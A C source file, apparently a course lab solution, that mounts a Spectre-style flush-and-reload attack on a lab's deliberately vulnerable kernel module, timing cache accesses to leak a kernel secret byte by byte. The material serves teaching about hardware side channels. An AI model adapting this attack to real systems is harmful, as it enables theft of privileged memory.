/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define NUM_ATTEMPTS 100

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

static void flush_shared_memory(char *shared_memory) {
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
    }
}

static char leak_byte_at_offset(int kernel_fd, char *shared_memory, size_t offset) {
    int scores[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};

    for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
        uint64_t best_latency = UINT64_MAX;
        size_t best_candidate = 0;

        flush_shared_memory(shared_memory);
        call_kernel_part1(kernel_fd, shared_memory, offset);

        for (size_t candidate = 0; candidate < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; candidate++) {
            uint64_t latency = time_access(&shared_memory[candidate * SHD_SPECTRE_LAB_PAGE_SIZE]);
            if (latency < best_latency) {
                best_latency = latency;
                best_candidate = candidate;
            }
        }

        scores[best_candidate]++;
    }

    int best_score = -1;
    size_t best_candidate = 0;
    for (size_t candidate = 0; candidate < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; candidate++) {
        if (scores[candidate] > best_score) {
            best_score = scores[candidate];
            best_candidate = candidate;
        }
    }

    return (char)best_candidate;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte = leak_byte_at_offset(kernel_fd, shared_memory, current_offset);

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
